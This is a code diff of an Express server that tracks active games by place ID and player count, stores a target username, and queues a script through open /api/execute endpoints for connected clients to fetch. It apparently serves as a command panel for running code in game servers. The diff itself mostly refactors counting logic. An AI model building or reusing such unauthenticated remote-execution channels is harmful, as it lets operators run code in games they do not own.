@@ -58,9 +58,10 @@ users['tr0llzkidd'] = {
     usedKey: adminKey
 };
 keys[adminKey] = { usedBy: 'tr0llzkidd' };
-console.log(`Admin key: ${adminKey}`);
+console.log(`Admin key (for reference): ${adminKey}`);
 
 let targetUsername = "";
+let latestScript = "";
 
 // ========== Public endpoints ==========
 app.post('/api/register', (req, res) => {
@@ -120,29 +121,15 @@ app.post('/api/games/update', (req, res) => {
     try {
         const data = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
         const incomingGames = data.games || [];
+        
         // Update or add each game
         incomingGames.forEach(game => {
             if (game.id && parseInt(game.players) > 0) {
-                gamesMap[game.id] = game; // overwrite with latest data
+                gamesMap[game.id] = game; // store full game object (includes name, id, placeId, players)
+            } else if (game.id && parseInt(game.players) === 0) {
+                delete gamesMap[game.id]; // remove if zero players
             }
         });
-        // Optionally, remove games with 0 players (already filtered above)
-        // But we keep them in map with 0 players? Better to remove if 0.
-        // Actually, we only add if players > 0, so games with 0 are not added.
-        // If a game had players and now has 0, we need to remove it.
-        // We'll rely on the fact that if a game sends 0 players, it won't be added,
-        // but old entry might linger. To clean, we could check periodically or on request.
-        // For simplicity, we'll remove when we receive 0.
-        // However, the incomingGames array might contain a game with 0 players.
-        // We should delete from map if players == 0.
-        incomingGames.forEach(game => {
-            if (game.id && parseInt(game.players) === 0) {
-                delete gamesMap[game.id];
-            }
-        });
-        
-        // Also update global players (sum of all game players)
-        globalPlayers = Object.values(gamesMap).reduce((sum, g) => sum + (parseInt(g.players) || 0), 0);
         
         res.send('OK');
     } catch (e) {
@@ -153,13 +140,15 @@ app.post('/api/games/update', (req, res) => {
 
 app.get('/api/games', (req, res) => {
     const gamesList = Object.values(gamesMap);
+    const totalPlayers = gamesList.reduce((sum, g) => sum + (parseInt(g.players) || 0), 0);
     res.json({
         total: gamesList.length,
-        players: globalPlayers,
+        players: totalPlayers,
         games: gamesList
     });
 });
 
+// ========== Settings / GUI endpoints ==========
 app.post('/api/setuser', (req, res) => {
     targetUsername = req.body || "";
     res.send('OK');
@@ -169,8 +158,7 @@ app.get('/api/getuser', (req, res) => {
     res.send(targetUsername);
 });
 
-// Script executor endpoints (unchanged)
-let latestScript = "";
+// ========== Executor endpoints ==========
 app.post('/api/execute', (req, res) => {
     latestScript = req.body || "";
     res.send('OK');
@@ -181,8 +169,9 @@ app.get('/api/execute', (req, res) => {
     latestScript = "";
 });
 
+// ========== Test endpoint ==========
 app.get('/api/test', (req, res) => {
-    res.json({ status: 'online', games: Object.keys(gamesMap).length, players: globalPlayers, target: targetUsername });
+    res.json({ status: 'online', games: Object.keys(gamesMap).length, target: targetUsername });
 });
 
 app.get('/', (req, res) => {
